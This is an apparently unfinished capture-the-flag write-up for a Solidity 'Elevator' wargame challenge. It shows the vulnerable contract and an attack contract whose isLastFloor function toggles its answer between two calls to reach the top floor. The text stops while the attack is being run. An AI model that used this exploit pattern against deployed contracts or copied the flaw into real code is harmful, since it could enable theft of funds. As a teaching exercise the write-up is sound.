# Task

This elevator won't let you reach the top of your building. Right?

# Contract

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

Lets get the contract address and contract abi

![image](https://github.com/user-attachments/assets/516d6c35-6444-48f6-aaa2-42618867c170)

We'll start out by using cast to check the state of the elevator

![image](https://github.com/user-attachments/assets/fb8e9fdf-ab41-4ed3-ad3e-f26a50dcd251)

We get the "false" response, this means we aren't at the top of the building yet

Lets check the floor we are at

![image](https://github.com/user-attachments/assets/111dcded-99a1-4041-bc06-9c533ab567f9)

We are at floor "0".

To solve this chall we have to be on the last floor. Lets write our attack contract

```sol
//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./elevator.sol";

contract elevatorAttack {
   bool public toggle = true;
   Elevator public target;

   constructor(address _targetAddr) public {
    target = Elevator(_targetAddr);
   }
   
   function isLastFloor(uint) public returns (bool) {
        toggle = !toggle;
        return toggle;
   }

    function setTop(uint _floor) public {
        target.goTo(_floor);
    }
}
```


Lets deploy this attack contract with forge

![image](https://github.com/user-attachments/assets/65925b13-aaa0-44a1-bbfa-82150462beb8)

Now that we've successfully deployed this, lets interact with the functions

We'll start by setting the floor 








































